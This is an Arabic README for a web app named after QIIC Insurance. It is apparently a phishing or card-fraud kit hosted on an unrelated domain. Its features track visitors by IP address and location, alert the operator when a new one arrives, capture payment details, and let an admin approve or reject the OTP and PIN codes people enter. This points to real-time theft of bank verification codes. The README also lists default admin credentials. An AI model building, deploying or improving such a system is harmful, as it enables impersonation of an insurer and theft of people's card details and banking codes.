# 🚗 QIIC Insurance System

> نظام تأمين المركبات الشامل مع تتبع رحلة العميل في الوقت الفعلي

## 📋 نظرة عامة

نظام متكامل لإدارة طلبات تأمين المركبات يوفر:
- ✅ تتبع رحلة العميل خطوة بخطوة في الوقت الفعلي
- ✅ لوحة تحكم إدارية محسّنة مع إحصائيات فورية
- ✅ نظام دفع متكامل (DCC / QPay)
- ✅ التحقق من OTP و PIN مع الموافقة/الرفض
- ✅ قاعدة بيانات MySQL محسّنة مع Stored Procedures

## 🛠️ التقنيات المستخدمة

### Backend
- **Node.js** + Express.js
- **Socket.IO v4.8.1** للاتصال الفوري
- **MySQL/MariaDB** (Hostinger VPS)
- **JWT** للمصادقة

### Frontend
- **React 18** + Vite
- **Tailwind CSS** للتصميم
- **Lucide React** للأيقونات
- **Socket.IO Client** للاتصال الفوري

## 📁 هيكل المشروع

```
QIIC/
├── backend/              # خادم Express + Socket.IO
│   ├── server.js        # الملف الرئيسي
│   ├── utils/           # مكتبات JWT
│   ├── .env.production  # إعدادات الإنتاج
│   └── package.json
│
├── frontend/            # تطبيق React
│   ├── src/
│   │   ├── pages/      # صفحات التطبيق
│   │   ├── components/ # مكونات قابلة لإعادة الاستخدام
│   │   ├── context/    # Socket Context
│   │   ├── services/   # API Services
│   │   └── styles/     # CSS Modules
│   └── package.json
│
├── database/            # SQL Scripts
│   └── setup-mysql-db.sql
│
├── docs/                # الوثائق
│   └── DEPLOYMENT.md
│
└── nginx-config.conf    # إعدادات Nginx
```

## 🚀 التثبيت والتشغيل

### المتطلبات
- Node.js >= 18.x
- MySQL/MariaDB >= 8.0
- npm >= 9.x

### 1. استنساخ المشروع
```bash
git clone https://github.com/mohammadbanihani799-star/qiic-insurance-system.git
cd qiic-insurance-system
```

### 2. إعداد Backend
```bash
cd backend
npm install
cp .env.example .env
# عدّل ملف .env بإعدادات قاعدة البيانات
node server.js
```

### 3. إعداد Frontend
```bash
cd frontend
npm install
npm run dev
```

### 4. إعداد قاعدة البيانات
```bash
# للـ MySQL CLI
mysql -u username -p database_name < database/setup-mysql-db.sql

# أو استخدم phpMyAdmin
# افتح ملف database/setup-mysql-db.sql وانسخ كل قسم (⚡ SECTION) بشكل منفصل
```

## 📊 قاعدة البيانات

### الجداول الرئيسية
- `customer_sessions` - تتبع الجلسات
- `user_locations` - مواقع المستخدمين
- `car_details` - تفاصيل المركبات
- `insurance_info` - معلومات التأمين
- `payments` - معاملات الدفع
- `otp_codes` - رموز OTP
- `pin_codes` - رموز PIN

### Stored Procedures
1. `GetCustomerJourney(ip_address)` - استرجاع بيانات العميل
2. `DeleteCustomerData(ip_address)` - حذف بيانات العميل
3. `UpdatePaymentStatus(...)` - تحديث حالة الدفع
4. `ApproveOTP(...)` - الموافقة على OTP
5. `RejectOTP(...)` - رفض OTP
6. `ApprovePIN(...)` - الموافقة على PIN
7. `RejectPIN(...)` - رفض PIN

### Analytics Views
- `vw_active_customers` - العملاء النشطون
- `vw_payment_stats` - إحصائيات الدفع
- `vw_otp_stats` - إحصائيات OTP
- `vw_pin_stats` - إحصائيات PIN

## 🔐 المتغيرات البيئية

### Backend (.env)
```env
DB_HOST=localhost
DB_USER=root
DB_PASSWORD=yourpassword
DB_NAME=u262632985_qic
DB_PORT=3306
PORT=4000
JWT_SECRET=your-secret-key
```

### Frontend (.env)
```env
VITE_SOCKET_URL=http://localhost:4000
VITE_API_URL=http://localhost:4000
```

## 🌐 النشر (Production)

راجع ملف [docs/DEPLOYMENT.md](docs/DEPLOYMENT.md) للحصول على دليل شامل للنشر على:
- Hostinger (Frontend)
- VPS (Backend)
- MySQL Database Setup

## 🎨 لوحة التحكم الإدارية

### المميزات
- ✅ تتبع فوري لجميع العملاء النشطين
- ✅ عرض الصفحة الحالية والموقع الجغرافي
- ✅ إحصائيات شاملة (OTP، PIN، الدفعات)
- ✅ إشعارات صوتية عند دخول عميل جديد
- ✅ نظام الموافقة/الرفض للـ OTP والـ PIN
- ✅ تصميم حديث مع تأثيرات حركية

### الوصول
```
URL: https://ielts.sbs/admin/login
Username: admin
Password: admin123
```

## 📱 رحلة العميل

1. **Car Details** - إدخال تفاصيل السيارة
2. **More Details** - معلومات إضافية
3. **Quote** - عرض السعر
4. **Select Insurance** - اختيار التأمين
5. **Plate Number** - رقم اللوحة
6. **Policy Date** - تاريخ البوليصة
7. **Insurance Info** - معلومات التأمين
8. **Payment** - الدفع (DCC/QPay)
9. **OTP Verification** - التحقق من OTP
10. **PIN Verification** - التحقق من PIN

## 🧪 الاختبار

### اختبار Backend
```bash
cd backend
npm test
```

### اختبار قاعدة البيانات
```sql
-- اختبار الإجراءات المخزّنة
CALL GetCustomerJourney('192.168.1.100');

-- اختبار العروض
SELECT * FROM vw_active_customers;
SELECT * FROM vw_payment_stats;
```

## 🐛 استكشاف الأخطاء

### Backend لا يعمل
```bash
# تحقق من المنفذ
netstat -ano | findstr :4000

# تحقق من قاعدة البيانات
mysql -u username -p -e "SHOW DATABASES;"
```

### Frontend CORS Error
```javascript
// تحقق من backend/server.js
const corsOrigins = [
  'http://localhost:5173',
  'https://ielts.sbs'
];
```

### Socket.IO لا يتصل
```javascript
// تحقق من frontend .env
VITE_SOCKET_URL=https://ielts.sbs  // بدون /api
```

## 📚 الوثائق الإضافية

- [دليل النشر الكامل](docs/DEPLOYMENT.md)
- [API Documentation](docs/API.md) (قيد التطوير)
- [Database Schema](database/setup-mysql-db.sql)

## 🤝 المساهمة

1. Fork المشروع
2. أنشئ فرع للميزة (`git checkout -b feature/AmazingFeature`)
3. Commit التغييرات (`git commit -m 'Add some AmazingFeature'`)
4. Push للفرع (`git push origin feature/AmazingFeature`)
5. افتح Pull Request

## 📄 الترخيص

هذا المشروع مرخّص تحت رخصة MIT - راجع ملف LICENSE للتفاصيل.

## 👨‍💻 المطور

**Mohammad Banihani**
- GitHub: [@mohammadbanihani799-star](https://github.com/mohammadbanihani799-star)
- Repository: [qiic-insurance-system](https://github.com/mohammadbanihani799-star/qiic-insurance-system)

## 🙏 شكر وتقدير

- Hostinger لاستضافة الـ Frontend
- VPS (194.164.72.37) للـ Backend
- Socket.IO للاتصال الفوري
- React و Tailwind CSS للواجهة

---

<div align="center">
  Made with ❤️ for QIIC Insurance
</div>
